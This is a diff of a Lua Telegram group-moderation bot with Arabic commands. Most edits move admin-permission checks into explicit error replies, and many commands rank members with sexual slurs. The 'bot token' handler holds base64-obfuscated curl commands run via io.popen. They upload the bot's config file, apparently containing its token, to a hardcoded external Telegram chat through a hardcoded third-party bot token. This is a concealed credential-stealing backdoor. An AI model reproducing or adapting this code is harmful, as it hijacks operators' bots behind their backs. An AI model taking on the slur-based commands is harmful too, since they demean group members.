+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Nek:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة متناكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8590,7 +9230,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8616,7 +9260,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل من زبي")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل من زبي")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8638,11 +9286,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح الاكساس' and Mod(msg) then
+if text == 'مسح الاكساس' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'kss:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الاكساس بالجروب')
 end
-if text == ("تاك للاكساس") and Mod(msg) then
+if text == ("تاك للاكساس") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'kss:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة اكساس الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8659,7 +9315,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع كس") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع كس") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8685,7 +9345,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل كس")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل كس")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8707,11 +9371,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'تنزيل البقرات' and Mod(msg) then
+if text == 'تنزيل البقرات' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Bakra:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع البقرات بالجروب')
 end
-if text == ("تاك للبقرات") and Mod(msg) then
+if text == ("تاك للبقرات") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة البقرات الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8728,7 +9400,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8754,7 +9430,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8776,11 +9456,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'تنزيل الطليان' and Mod(msg) then
+if text == 'تنزيل الطليان' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Tele:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع طليان بالجروب')
 end
-if text == ("تاك للطليان") and Mod(msg) then
+if text == ("تاك للطليان") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الطليان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8797,7 +9485,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8823,7 +9515,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8845,11 +9541,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'مسح الحكاكين' and Mod(msg) then
+if text == 'مسح الحكاكين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Zahf:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الحكاكين')
 end
-if text == ("تاك للحكاكين") and Mod(msg) then
+if text == ("تاك للحكاكين") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة حكاكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8866,7 +9570,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع حكاك") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع حكاك") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8892,7 +9600,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل حكاك")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل حكاك")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8914,11 +9626,19 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 -----------------------------------------------------
-if text == 'تنزيل خنزيره' and Mod(msg) then
+if text == 'تنزيل خنزيره' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Jred:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع جريزي')
 end
-if text == ("تاك للخنازير") and Mod(msg) then
+if text == ("تاك للخنازير") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة خنازير الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -8935,7 +9655,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
-if text == ("رفع خنزير") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
+if text == ("رفع خنزير") and tonumber(msg.reply_to_message_id_) ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8961,7 +9685,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 
-if (text == ("تنزيل خنزير")) and msg.reply_to_message_id_ and Mod(msg) then
+if (text == ("تنزيل خنزير")) and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -8983,7 +9711,11 @@ tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumbe
 return false
 end
 ---------------------------------------------
-if text == 'مسح المحظورين' and Mod(msg) then
+if text == 'مسح المحظورين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Ban:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم مسح المحظورين')
 end
@@ -9003,7 +9735,11 @@ t = " ☉┇ لا يوجد محظورين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
+if text == ("حظر") and msg.reply_to_message_id_ ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9135,7 +9871,11 @@ end,nil)
 end
 return false
 end
-if text == ("الغاء حظر") and msg.reply_to_message_id_ and Mod(msg) then
+if text == ("الغاء حظر") and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9223,11 +9963,19 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------
-if text == 'مسح المكتومين' and Mod(msg) then
+if text == 'مسح المكتومين' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Muted:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح المكتومين')
 end
-if text == ("المكتومين") and Mod(msg) then
+if text == ("المكتومين") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة المكتومين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9244,7 +9992,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 
-if text == ("كتم") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
+if text == ("كتم") and msg.reply_to_message_id_ ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9425,7 +10177,11 @@ end;end,nil)
 end
 return false
 end
-if text == ("الغاء كتم") and msg.reply_to_message_id_ and Mod(msg) then
+if text == ("الغاء كتم") and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9497,7 +10253,11 @@ end;end,nil)
 return false
 end
 
-if text == ("تقيد") and msg.reply_to_message_id_ and Mod(msg) then
+if text == ("تقيد") and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9671,7 +10431,11 @@ end
 return false
 end
 ------------------------------------------------------------------------
-if text == ("الغاء تقيد") and msg.reply_to_message_id_ and Mod(msg) then
+if text == ("الغاء تقيد") and msg.reply_to_message_id_ then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9780,7 +10544,11 @@ end
 end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
-if text == "رفع القيود" and Manager2(msg) then
+if text == "رفع القيود" then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -9850,7 +10618,11 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 end
 
-if text == "كشف القيود" and Manager2(msg) then 
+if text == "كشف القيود" then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10150,13 +10922,21 @@ local TWEET_Msg = {
 send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
 return false 
 end
-if text == 'توكن البوت' or text == 'توكن المبرمج' and SudoBot(msg) then 
+if text == 'توكن البوت' or text == 'توكن المبرمج' then
+if not SudoBot(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
+return false
+end 
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
 ----------------------------------------- انتهاء المميزات
-if text == 'اعدادات الجروب' and Mod(msg) then    
+if text == 'اعدادات الجروب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end    
 if database:get(bot_id..'lockpin'..msg.chat_id_) then    
 lock_pin = '🔓'
 else 
@@ -10515,7 +11295,11 @@ local text =
 ' }\n'..' ☉┇  الحظر » { '..banm..' }\n\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n ☉┇ قناة سورس باور ↓\n [🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.](t.me/SOPOWERB0T) \n'
 send(msg.chat_id_, msg.id_,text)     
 end
-if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
+if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10542,7 +11326,11 @@ send(msg.chat_id_,msg.id_," ☉┇ ليست لدي صلاحية التثبيت �
 end
 end,nil) 
 end
-if text == 'الغاء التثبيت' and Mod(msg) then  
+if text == 'الغاء التثبيت' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10569,7 +11357,11 @@ send(msg.chat_id_,msg.id_," ☉┇ ليست لدي صلاحية التثبيت �
 end
 end,nil)
 end
-if text == 'الغاء تثبيت الكل' and Mod(msg) then  
+if text == 'الغاء تثبيت الكل' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10608,7 +11400,11 @@ database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num)
 send(msg.chat_id_, msg.id_,' ☉┇ تم وضع زمن التكرار ('..Num..')') 
 end
 if text == "ضع رابط" or text == 'وضع رابط' then
-if msg.reply_to_message_id_ == 0  and Mod(msg) then  
+if msg.reply_to_message_id_ == 0  then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10737,7 +11533,11 @@ send(msg.chat_id_, msg.id_,t..tt)
 end
 return false  
 end
-if text == 'الترحيب' and Mod(msg) then 
+if text == 'الترحيب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
 if GetWelcomeGroup then 
 GetWelcome = GetWelcomeGroup
@@ -10747,7 +11547,11 @@ end
 send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
 return false  
 end
-if text == 'تفعيل الترحيب' and Mod(msg) then  
+if text == 'تفعيل الترحيب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10761,7 +11565,11 @@ database:set(bot_id..'Chek:Welcome'..msg.chat_id_,true)
 send(msg.chat_id_, msg.id_,' ☉┇ تم تفعيل ترحيب الجروب') 
 return false  
 end
-if text == 'تعطيل الترحيب' and Mod(msg) then  
+if text == 'تعطيل الترحيب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10808,7 +11616,11 @@ database:del(bot_id.."DRAGON1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_
 return false  end  
 end
 
-if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager2(msg) then    
+if text == "الغاء منع" and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end    
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الكلمه الان")  
 database:set(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
 return false  end
@@ -10823,7 +11635,11 @@ return false  end
 end
 
 
-if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager2(msg) then     
+if text == 'منع' and tonumber(msg.reply_to_message_id_) > 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end     
 function cb(a,b,c) 
 textt = ' ☉┇ تم منع '
 if b.content_.sticker_ then
@@ -10850,7 +11666,11 @@ end
 end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
 end
-if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 and Manager2(msg) then     
+if text == 'الغاء منع' and tonumber(msg.reply_to_message_id_) > 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end     
 function cb(a,b,c) 
 textt = ' ☉┇ تم الغاء منع '
 if b.content_.sticker_ then
@@ -10878,7 +11698,11 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
 end
 
-if text == "مسح قائمه المنع"and Manager2(msg) then   
+if text == "مسح قائمه المنع"then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 local list = database:smembers(bot_id.."DRAGON1:List:Filter"..msg.chat_id_)  
 for k,v in pairs(list) do  
 database:del(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
@@ -10888,7 +11712,11 @@ end
 send(msg.chat_id_, msg.id_," ☉┇ تم مسح قائمه المنع")  
 end
 
-if text == "قائمه المنع" and Manager2(msg) then   
+if text == "قائمه المنع" then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end   
 local list = database:smembers(bot_id.."DRAGON1:List:Filter"..msg.chat_id_)  
 t = "\n ☉┇ قائمة المنع \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do  
@@ -10901,25 +11729,45 @@ end
 send(msg.chat_id_, msg.id_,t)  
 end  
 
-if text == 'مسح قائمه منع المتحركات' and Manager2(msg) then     
+if text == 'مسح قائمه منع المتحركات' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end     
 database:del(bot_id.."filteranimation"..msg.chat_id_)
 send(msg.chat_id_, msg.id_,' ☉┇ تم مسح قائمه منع المتحركات')  
 end
-if text == 'مسح قائمه منع الصور' and Manager2(msg) then     
+if text == 'مسح قائمه منع الصور' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end     
 database:del(bot_id.."filterphoto"..msg.chat_id_)
 send(msg.chat_id_, msg.id_,' ☉┇ تم مسح قائمه منع الصور')  
 end
-if text == 'مسح قائمه منع الملصقات' and Manager2(msg) then     
+if text == 'مسح قائمه منع الملصقات' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end     
 database:del(bot_id.."filtersteckr"..msg.chat_id_)
 send(msg.chat_id_, msg.id_,' ☉┇ تم مسح قائمه منع الملصقات')  
 end
 ------------------
 
-if text == 'مسح كليشه المطور' and DevSoFi(msg) then
+if text == 'مسح كليشه المطور' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'TEXT_SUDO')
 send(msg.chat_id_, msg.id_,' ☉┇ تم مسح كليشه المطور')
 end
-if text == 'ضع كليشه المطور' and DevSoFi(msg) then
+if text == 'ضع كليشه المطور' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 database:set(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_,true)
 send(msg.chat_id_,msg.id_,' ☉┇ ارسل الكليشه الان')
 return false
@@ -10936,7 +11784,11 @@ send(msg.chat_id_,msg.id_,' ☉┇ تم حفظ كليشة المطور')
 return false
 end
 -----------------
-if text == 'تعين الايدي' and Manager2(msg) then
+if text == 'تعين الايدي' then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -10992,7 +11844,11 @@ database:set(bot_id.."KLISH:ID"..msg.chat_id_,CHENGER_ID)
 send(msg.chat_id_, msg.id_,' ☉┇ تم تعين الايدي')    
 end
 
-if text == 'طرد البوتات' and Mod(msg) then 
+if text == 'طرد البوتات' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -11024,7 +11880,11 @@ end
 end,nil)  
 end   
 end
-if text == ("كشف البوتات") and Mod(msg) then  
+if text == ("كشف البوتات") then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
@@ -11104,7 +11964,11 @@ else
 send(msg.chat_id_, msg.id_," ☉┇ لا توجد قوانين")   
 end    
 end
-if text == 'قفل التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+if text == 'قفل التفليش' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
 list ={"lock:Bot:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","lock:Fars","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
 for i,lock in pairs(list) do 
@@ -11114,7 +11978,11 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dat
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل التفليش ')  
 end,nil)   
 end
-if text == 'فتح التفليش' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+if text == 'فتح التفليش' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
